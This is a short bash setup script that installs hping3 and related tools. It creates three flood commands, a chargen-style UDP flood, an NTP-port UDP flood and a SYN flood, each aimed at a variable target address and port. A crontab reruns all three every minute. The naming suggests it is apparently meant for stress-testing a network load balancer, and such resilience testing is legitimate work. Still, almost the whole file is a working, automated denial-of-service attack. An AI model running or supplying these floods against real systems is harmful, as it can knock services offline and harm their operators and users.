#! /bin/bash

apt update
apt install -y tcpdump fping dnsutils netsniff-ng apache2-utils wrk netcat hping3

iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

# chargen

cat <<EOF > /usr/local/bin/flood_nlb_chargen
/usr/sbin/hping3 -n --flood --udp -s 19 --keep -p ${TARGET_PORT} ${TARGET_VIP}
EOF
chmod a+x /usr/local/bin/flood_nlb_chargen

# ntp amplification

cat <<EOF > /usr/local/bin/flood_nlb_ntp
/usr/sbin/hping3 -n --flood --udp -s 123 --keep -p ${TARGET_PORT} ${TARGET_VIP}
EOF
chmod a+x /usr/local/bin/flood_nlb_ntp

# syn flood

cat <<EOF > /usr/local/bin/flood_nlb_syn
/usr/sbin/hping3 -n --flood -S -p ${TARGET_PORT} ${TARGET_VIP}
EOF
chmod a+x /usr/local/bin/flood_nlb_syn

# jobs
#-------------------------------------------

cat <<EOF > /tmp/crontab.txt
*/1 * * * * /usr/bin/timeout 59 /usr/local/bin/flood_nlb_chargen 2>&1 > /dev/null
*/1 * * * * /usr/bin/timeout 59 /usr/local/bin/flood_nlb_ntp 2>&1 > /dev/null
*/1 * * * * /usr/bin/timeout 59 /usr/local/bin/flood_nlb_syn 2>&1 > /dev/null
EOF
crontab /tmp/crontab.txt
